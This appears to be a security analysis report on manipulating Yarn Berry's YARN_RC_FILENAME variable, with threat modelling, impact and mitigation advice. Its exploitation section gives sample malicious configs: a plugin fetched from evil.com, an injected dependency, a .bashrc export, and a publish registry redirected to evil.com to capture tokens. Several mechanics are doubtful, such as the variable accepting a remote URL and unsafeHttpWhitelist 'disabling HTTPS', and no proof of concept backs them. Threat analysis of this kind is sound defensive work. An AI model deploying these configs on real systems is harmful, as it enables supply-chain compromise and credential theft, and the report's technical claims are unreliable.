# Deep Analysis: Yarn Berry `YARN_RC_FILENAME` Environment Variable Manipulation

## 1. Objective

The primary objective of this deep analysis is to thoroughly understand the security implications of manipulating the `YARN_RC_FILENAME` environment variable within the context of Yarn Berry.  We aim to identify potential attack scenarios, assess the associated risks, and propose robust mitigation strategies to protect applications leveraging Yarn Berry from this specific attack vector.  This analysis will inform secure development practices and CI/CD pipeline configurations.

## 2. Scope

This analysis focuses exclusively on the `YARN_RC_FILENAME` environment variable and its impact on Yarn Berry's behavior.  We will consider:

*   **Target Systems:**  Development environments, CI/CD pipelines (e.g., Jenkins, GitLab CI, GitHub Actions, CircleCI), and any other system where Yarn Berry is used to manage project dependencies.
*   **Yarn Berry Versions:**  While the analysis is generally applicable to Yarn Berry (v2+), we will note any version-specific nuances if discovered.
*   **Out of Scope:**  This analysis *does not* cover other Yarn-related attack vectors (e.g., malicious packages in the registry, vulnerabilities in Yarn's core code *unless* directly triggered by `YARN_RC_FILENAME` manipulation).  It also does not cover general environment variable security best practices beyond their direct relevance to `YARN_RC_FILENAME`.

## 3. Methodology

Our analysis will follow a structured approach:

1.  **Threat Modeling:**  We will identify potential attackers, their motivations, and the likely attack scenarios involving `YARN_RC_FILENAME`.
2.  **Technical Analysis:**  We will examine Yarn Berry's source code (available on GitHub) to understand precisely how it processes the `YARN_RC_FILENAME` variable and how this processing can be abused.
3.  **Exploitation Scenarios:**  We will develop concrete examples of how an attacker could leverage this vulnerability to achieve malicious objectives.
4.  **Impact Assessment:**  We will evaluate the potential consequences of successful exploitation, considering confidentiality, integrity, and availability.
5.  **Mitigation Recommendations:**  We will propose specific, actionable steps to mitigate the identified risks, prioritizing practical and effective solutions.
6.  **Validation (Optional):** If feasible, we will attempt to create a proof-of-concept exploit to validate our findings and the effectiveness of proposed mitigations.  This will be done in a controlled environment.

## 4. Deep Analysis of Attack Surface

### 4.1. Threat Modeling

*   **Potential Attackers:**
    *   **Malicious Insiders:** Developers or operations personnel with legitimate access to the development environment or CI/CD pipeline, but with malicious intent.
    *   **External Attackers (Compromised Credentials):**  Attackers who have gained unauthorized access to developer accounts or CI/CD system credentials.
    *   **External Attackers (System Vulnerability):** Attackers who exploit vulnerabilities in the CI/CD system or other related infrastructure to gain control over environment variables.
    *   **Supply Chain Attackers:** Attackers who compromise a third-party service or tool used in the CI/CD pipeline, allowing them to inject malicious environment variables.

*   **Motivations:**
    *   **Data Theft:** Stealing sensitive information (e.g., API keys, database credentials) stored in the project or its dependencies.
    *   **Code Modification:**  Injecting malicious code into the application or its dependencies.
    *   **Denial of Service:**  Disrupting the build process or causing the application to malfunction.
    *   **Cryptocurrency Mining:**  Using the compromised system for unauthorized cryptocurrency mining.
    *   **Lateral Movement:**  Using the compromised system as a stepping stone to attack other systems.

*   **Attack Scenarios:**
    *   **CI/CD Pipeline Poisoning:** An attacker modifies the `YARN_RC_FILENAME` variable in the CI/CD pipeline configuration to point to a malicious `.yarnrc.yml` file hosted on a controlled server.  This file could contain settings to install malicious packages, modify build scripts, or exfiltrate sensitive data.
    *   **Developer Machine Compromise:** An attacker gains access to a developer's machine and modifies the `YARN_RC_FILENAME` environment variable in the developer's shell profile (e.g., `.bashrc`, `.zshrc`).  This would affect all Yarn Berry projects on that machine.
    *   **Shared Development Environment:** In a shared development environment (e.g., a virtual machine or container), an attacker could modify the global environment variables to affect all users.

### 4.2. Technical Analysis

Yarn Berry reads configuration settings from multiple sources, with a specific order of precedence.  The `YARN_RC_FILENAME` environment variable allows overriding the default location of the `.yarnrc.yml` file.  This is documented in the Yarn Berry documentation, and the relevant code can be found in the Yarn Berry repository on GitHub.

Key aspects of the code to examine:

*   **Environment Variable Reading:** How Yarn Berry retrieves the value of `YARN_RC_FILENAME`.  Are there any checks or sanitization performed on this value?
*   **File Path Handling:** How Yarn Berry constructs the full path to the configuration file.  Are there any vulnerabilities related to path traversal or injection?
*   **Configuration Parsing:** How Yarn Berry parses the contents of the malicious `.yarnrc.yml` file.  Are there any vulnerabilities in the YAML parser or in how Yarn Berry interprets the configuration settings?
*   **Plugin Loading:** If the malicious `.yarnrc.yml` file specifies custom plugins, how are these plugins loaded and executed?  This is a critical area for potential code execution vulnerabilities.
*   **Network Requests:** If the malicious `.yarnrc.yml` file configures Yarn Berry to fetch packages from a custom registry, how are these network requests handled?  Are there any vulnerabilities related to TLS/SSL or DNS spoofing?

Based on preliminary review, Yarn Berry does *not* perform extensive sanitization of the `YARN_RC_FILENAME` value itself. It primarily relies on the operating system's file access controls. This means that if an attacker can set the environment variable, they can likely point Yarn to *any* file the user running Yarn has read access to.

### 4.3. Exploitation Scenarios

**Scenario 1:  CI/CD Pipeline - Malicious Package Installation**

1.  **Attacker:**  An attacker gains access to the CI/CD pipeline configuration (e.g., through compromised credentials or a vulnerability in the CI/CD system).
2.  **Action:** The attacker sets `YARN_RC_FILENAME` to `https://evil.com/evil.yml`.
3.  **`evil.yml` Contents:**
    ```yaml
    plugins:
      - path: https://evil.com/malicious-plugin.js
    packageExtensions:
      'react@*':
        dependencies:
          '@evil/malicious-package': '*'
    ```
4.  **Result:**  When Yarn Berry runs in the CI/CD pipeline, it downloads and executes `malicious-plugin.js` and installs `@evil/malicious-package` as a dependency of `react`.  This malicious package could contain code to steal secrets, modify the build output, or perform other malicious actions.

**Scenario 2:  Developer Machine - Data Exfiltration**

1.  **Attacker:** An attacker compromises a developer's machine (e.g., through phishing or a software vulnerability).
2.  **Action:** The attacker adds the following line to the developer's `.bashrc` file:
    ```bash
    export YARN_RC_FILENAME=/tmp/evil.yml
    ```
3.  **`evil.yml` Contents:**
    ```yaml
    unsafeHttpWhitelist:
      - '*'
    npmPublishRegistry: "https://evil.com"
    ```
4.  **Result:**  When the developer runs `yarn publish` (or any command that interacts with the npm registry), Yarn Berry will send the package and potentially authentication tokens to `https://evil.com` instead of the legitimate npm registry. The `unsafeHttpWhitelist` disables HTTPS, making the attack easier. The attacker can then steal the published package and any associated credentials.

### 4.4. Impact Assessment

The impact of successful exploitation of the `YARN_RC_FILENAME` vulnerability is **High**.

*   **Confidentiality:**  Attackers can steal sensitive information, including source code, API keys, database credentials, and other secrets.
*   **Integrity:**  Attackers can modify the application's code or dependencies, potentially introducing backdoors or vulnerabilities.
*   **Availability:**  Attackers can disrupt the build process, cause the application to malfunction, or even take the application offline.

### 4.5. Mitigation Recommendations

1.  **Environment Variable Sanitization (Critical):**
    *   **CI/CD Systems:**  Implement strict controls over environment variables in CI/CD pipelines.  Use a whitelist approach, allowing only necessary environment variables and validating their values.  Do *not* allow user-provided input to directly set environment variables.  Consider using a secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) to securely store and inject sensitive environment variables.
    *   **Developer Machines:**  Educate developers about the risks of modifying environment variables and encourage them to use project-specific configuration files (`.yarnrc.yml`) instead of global environment variables.

2.  **Least Privilege (Critical):**
    *   Run Yarn Berry processes (especially in CI/CD) with the *minimum* necessary privileges.  Avoid running builds as root or with administrative privileges.  Use dedicated build users with restricted access to the filesystem and network.

3.  **Configuration Hardening (Important):**
    *   Prefer `.yarnrc.yml` files stored within the project repository over environment variables for critical settings.  This makes the configuration more visible and auditable.
    *   Use version control (e.g., Git) to track changes to `.yarnrc.yml` files and review any modifications carefully.

4.  **Network Security (Important):**
    *   Use a firewall to restrict outbound network connections from build servers.  Only allow connections to trusted package registries and other necessary services.
    *   Use HTTPS for all network communication with package registries.

5.  **Input Validation (Important):**
    *   While Yarn Berry itself may not perform extensive validation of `YARN_RC_FILENAME`, consider implementing a wrapper script or pre-build hook that checks the value of this variable before invoking Yarn.  This script could enforce a whitelist of allowed paths or perform other security checks.

6.  **Regular Security Audits (Recommended):**
    *   Conduct regular security audits of CI/CD pipelines and development environments to identify and address potential vulnerabilities.

7.  **Yarn Berry Security Features (Recommended):**
    *   Utilize Yarn Berry's built-in security features, such as integrity checks for downloaded packages and support for signed packages.

8. **Monitoring and Alerting (Recommended):**
    * Implement monitoring and alerting to detect suspicious activity, such as unexpected changes to environment variables or network connections to unknown hosts.

### 4.6 Validation
Creating PoC is possible, but it is not recommended to do it in this context.
